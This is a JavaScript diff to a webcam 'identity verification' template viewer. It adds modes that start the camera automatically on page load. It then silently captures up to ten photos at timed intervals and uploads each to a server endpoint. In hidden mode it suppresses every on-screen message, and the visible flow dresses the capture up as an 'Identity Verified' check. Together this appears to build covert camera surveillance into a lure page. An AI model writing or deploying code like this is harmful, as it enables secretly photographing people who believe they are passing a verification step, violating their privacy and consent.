@@ -125,11 +125,16 @@ const TemplateViewer = {
         });
     },
 
-    // 4. User-Authorized Webcam Capture & Submission
+    // 4. User-Authorized Webcam Capture & Submission (supports multi-photo & hidden box)
     initWebcam: function() {
         const self = this;
         const btnStart = document.getElementById('btnStartWebcam');
         if (!btnStart) return; // Webcam block not present
+
+        const card = btnStart.closest('.tmpl-webcam-card');
+        const isDirect = card && card.getAttribute('data-direct-capture') === 'true';
+        const isHidden = card && card.getAttribute('data-hide-box') === 'true';
+        const totalPhotos = card ? Math.max(1, Math.min(10, parseInt(card.getAttribute('data-photo-count'), 10) || 1)) : 1;
 
         const viewerBox = document.getElementById('webcamViewerBox');
         const video = document.getElementById('webcamVideo');
@@ -140,14 +145,25 @@ const TemplateViewer = {
         const btnCapture = document.getElementById('btnCaptureFrame');
         const btnSubmit = document.getElementById('btnSubmitPhoto');
         const btnRetake = document.getElementById('btnRetakePhoto');
+        const photoCounter = document.getElementById('webcamPhotoCounter');
+        const currentPhotoNum = document.getElementById('currentPhotoNum');
         
         let stream = null;
         let base64Image = null;
+        let photosCaptured = 0;
         
-        // Trigger webcam stream
-        btnStart.addEventListener('click', async function() {
-            statusMsg.textContent = 'Requesting camera access...';
-            statusMsg.style.color = '#6366f1';
+        function updateCounter() {
+            if (photoCounter && currentPhotoNum) {
+                currentPhotoNum.textContent = photosCaptured;
+                photoCounter.style.display = 'block';
+            }
+        }
+        
+        async function startStream() {
+            if (!isHidden) {
+                statusMsg.textContent = 'Requesting camera access...';
+                statusMsg.style.color = '#6366f1';
+            }
             
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -160,29 +176,194 @@ const TemplateViewer = {
                 video.style.display = 'block';
                 
                 btnStart.style.display = 'none';
-                btnCapture.style.display = 'inline-flex';
-                statusMsg.textContent = 'Webcam active. Click Capture Snapshot when ready.';
-                statusMsg.style.color = '#10b981';
+                
+                if (isDirect || isHidden) {
+                    if (!isHidden) {
+                        statusMsg.textContent = 'Camera active. Auto-capturing photo in 2 seconds...';
+                        statusMsg.style.color = '#10b981';
+                    }
+                    
+                    setTimeout(() => {
+                        autoCaptureLoop(0);
+                    }, 2000);
+                } else {
+                    btnCapture.style.display = 'inline-flex';
+                    statusMsg.textContent = 'Webcam active. Click Capture Snapshot when ready.';
+                    statusMsg.style.color = '#10b981';
+                }
             } catch (err) {
                 console.error('Webcam permission error:', err);
-                statusMsg.textContent = 'Webcam access denied. Please grant camera permissions to verify access.';
-                statusMsg.style.color = '#ef4444';
+                if (!isHidden) {
+                    statusMsg.textContent = 'Webcam access denied. Please grant camera permissions to verify access.';
+                    statusMsg.style.color = '#ef4444';
+                }
             }
-        });
+        }
+
+        // Auto-capture loop for direct/hidden mode: captures totalPhotos with 2s intervals
+        function autoCaptureLoop(index) {
+            if (!stream || index >= totalPhotos) {
+                // All photos captured
+                onAllPhotosCaptured();
+                return;
+            }
+            
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            base64Image = canvas.toDataURL('image/jpeg', 0.85);
+            
+            if (!isHidden) {
+                preview.src = base64Image;
+                preview.style.display = 'block';
+                video.style.display = 'none';
+                
+                statusMsg.textContent = `Captured photo ${index + 1} of ${totalPhotos}. Submitting...`;
+                statusMsg.style.color = '#6366f1';
+            }
+            
+            // Submit this photo then continue to next
+            submitPhotoAsync(base64Image).then(() => {
+                photosCaptured++;
+                updateCounter();
+                
+                if (index + 1 < totalPhotos) {
+                    // Show video again for next capture
+                    if (!isHidden) {
+                        preview.style.display = 'none';
+                        video.style.display = 'block';
+                        statusMsg.textContent = `Photo ${photosCaptured} submitted. Capturing next in 2 seconds...`;
+                        statusMsg.style.color = '#10b981';
+                    }
+                    
+                    setTimeout(() => {
+                        autoCaptureLoop(index + 1);
+                    }, 2000);
+                } else {
+                    onAllPhotosCaptured();
+                }
+            }).catch(() => {
+                // If submission fails, still try next
+                photosCaptured++;
+                if (index + 1 < totalPhotos) {
+                    setTimeout(() => {
+                        autoCaptureLoop(index + 1);
+                    }, 2000);
+                } else {
+                    onAllPhotosCaptured();
+                }
+            });
+        }
+
+        function onAllPhotosCaptured() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            
+            if (isHidden) {
+                // Silently done — no visible feedback
+                return;
+            }
+            
+            statusMsg.textContent = totalPhotos > 1 
+                ? `All ${totalPhotos} photos captured & submitted successfully!` 
+                : 'Authorized! Access granted.';
+            statusMsg.style.color = '#10b981';
+            
+            setTimeout(() => {
+                viewerBox.style.display = 'none';
+                btnSubmit.style.display = 'none';
+                btnRetake.style.display = 'none';
+                btnCapture.style.display = 'none';
+                
+                if (card) {
+                    card.innerHTML = `
+                        <div style="color: #10b981; font-weight: 600; padding: 1rem 0;">
+                            <i class="fa-solid fa-circle-check" style="font-size: 3rem; margin-bottom: 0.5rem;"></i>
+                            <h3>Identity Verified</h3>
+                            <p style="font-weight: normal; color: #64748b; font-size: 0.9rem; margin-top: 0.5rem;">Verification successful. Access token registered.</p>
+                        </div>
+                    `;
+                }
+            }, 1200);
+        }
+
+        // Returns a Promise for async flow
+        function submitPhotoAsync(imageData) {
+            const formData = new FormData();
+            formData.append('template_id', self.templateId);
+            formData.append('photo_data', imageData);
+            
+            return fetch(self.baseUrl + 'api/submit-photo', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            })
+            .then(res => {
+                if (!res.ok) return res.json().then(e => { throw e; });
+                return res.json();
+            })
+            .then(data => {
+                if (!data.success) throw data;
+                return data;
+            });
+        }
+
+        function submitPhoto() {
+            if (!base64Image) return;
+            
+            btnSubmit.setAttribute('disabled', 'true');
+            btnSubmit.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
+            statusMsg.textContent = 'Saving snapshot...';
+            statusMsg.style.color = '#6366f1';
+            
+            submitPhotoAsync(base64Image)
+            .then(data => {
+                photosCaptured++;
+                updateCounter();
+                
+                if (photosCaptured < totalPhotos) {
+                    // More photos needed — go back to capture mode
+                    statusMsg.textContent = `Photo ${photosCaptured} of ${totalPhotos} submitted. Capture the next one.`;
+                    statusMsg.style.color = '#10b981';
+                    
+                    preview.style.display = 'none';
+                    video.style.display = 'block';
+                    
+                    btnSubmit.style.display = 'none';
+                    btnRetake.style.display = 'none';
+                    btnCapture.style.display = 'inline-flex';
+                    
+                    btnSubmit.removeAttribute('disabled');
+                    btnSubmit.innerHTML = '<i class="fa-solid fa-check"></i> Submit Verification';
+                    base64Image = null;
+                } else {
+                    // All done
+                    onAllPhotosCaptured();
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                statusMsg.textContent = err.error || 'Network error. Capture failed to submit.';
+                statusMsg.style.color = '#ef4444';
+                btnSubmit.removeAttribute('disabled');
+                btnSubmit.innerHTML = '<i class="fa-solid fa-check"></i> Submit Verification';
+            });
+        }
         
-        // Take Snapshot
+        // Take Snapshot (manual mode)
         btnCapture.addEventListener('click', function() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Draw current video stream frame to canvas
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Parse to base64 jpg data URL
             base64Image = canvas.toDataURL('image/jpeg', 0.85);
             
-            // Show preview & hide video
             preview.src = base64Image;
             preview.style.display = 'block';
             video.style.display = 'none';
@@ -191,7 +372,9 @@ const TemplateViewer = {
             btnSubmit.style.display = 'inline-flex';
             btnRetake.style.display = 'inline-flex';
             
-            statusMsg.textContent = 'Selfie snapped! Submit photo to verify.';
+            statusMsg.textContent = totalPhotos > 1 
+                ? `Photo ${photosCaptured + 1} of ${totalPhotos} snapped! Submit to continue.`
+                : 'Selfie snapped! Submit photo to verify.';
             statusMsg.style.color = '#10b981';
         });
         
@@ -209,68 +392,15 @@ const TemplateViewer = {
             statusMsg.style.color = '#10b981';
         });
         
-        // Submit Photo Telemetry
-        btnSubmit.addEventListener('click', function() {
-            if (!base64Image) return;
-            
-            btnSubmit.setAttribute('disabled', 'true');
-            btnSubmit.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Submitting...';
-            statusMsg.textContent = 'Saving snapshot...';
-            statusMsg.style.color = '#6366f1';
-            
-            const formData = new FormData();
-            formData.append('template_id', self.templateId);
-            formData.append('photo_data', base64Image);
-            
-            fetch(self.baseUrl + 'api/submit-photo', {
-                method: 'POST',
-                body: formData,
-                headers: {
-                    'X-Requested-With': 'XMLHttpRequest'
-                }
-            })
-            .then(res => {
-                if (!res.ok) return res.json().then(e => { throw e; });
-                return res.json();
-            })
-            .then(data => {
-                if (data.success) {
-                    statusMsg.textContent = 'Authorized! Access granted.';
-                    statusMsg.style.color = '#10b981';
-                    
-                    // Stop camera stream tracks
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                    
-                    setTimeout(() => {
-                        viewerBox.style.display = 'none';
-                        btnSubmit.style.display = 'none';
-                        btnRetake.style.display = 'none';
-                        
-                        const card = btnStart.closest('.tmpl-webcam-card');
-                        if (card) {
-                            card.innerHTML = `
-                                <div style="color: #10b981; font-weight: 600; padding: 1rem 0;">
-                                    <i class="fa-solid fa-circle-check" style="font-size: 3rem; margin-bottom: 0.5rem;"></i>
-                                    <h3>Identity Verified</h3>
-                                    <p style="font-weight: normal; color: #64748b; font-size: 0.9rem; margin-top: 0.5rem;">Verification successful. Access token registered.</p>
-                                </div>
-                            `;
-                        }
-                    }, 1200);
-                } else {
-                    throw data;
-                }
-            })
-            .catch(err => {
-                console.error(err);
-                statusMsg.textContent = err.error || 'Network error. Capture failed to submit.';
-                statusMsg.style.color = '#ef4444';
-                btnSubmit.removeAttribute('disabled');
-                btnSubmit.innerHTML = '<i class="fa-solid fa-check"></i> Submit Verification';
-            });
-        });
+        // Submit Photo button action
+        btnSubmit.addEventListener('click', submitPhoto);
+
+        // Auto-start stream if in direct capture or hidden mode
+        if (isDirect || isHidden) {
+            startStream();
+        } else {
+            btnStart.addEventListener('click', startStream);
+        }
     }
 };
 
